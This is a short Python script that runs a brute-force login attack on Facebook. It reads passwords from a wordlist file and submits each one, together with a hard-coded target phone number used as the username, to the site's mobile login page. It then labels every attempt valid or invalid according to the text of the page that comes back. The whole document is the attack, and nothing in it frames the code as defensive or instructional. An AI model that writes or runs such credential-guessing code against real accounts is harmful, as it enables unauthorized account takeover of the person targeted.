import sys
sys.stdout.reconfigure(encoding='utf-8')
import requests
from bs4 import BeautifulSoup

url = 'https://mbasic.facebook.com/'
data = {'username': '', 'password': ''}
usernames = ['01734906838']
password_file = 'wordlist.txt'

with open(password_file, 'r') as f:
    passwords = f.read().splitlines()

for username in usernames:
    for password in passwords:
        data['email'] = username
        data['pass'] = password
        response = requests.post(url, data=data)
        if 'log in or sign up' in response.text:
            print('Username: {}, Password: {}, Result: Invalid'.format(username, password))
        else:
            print('Username: {}, Password: {}, Result: Valid'.format(username, password))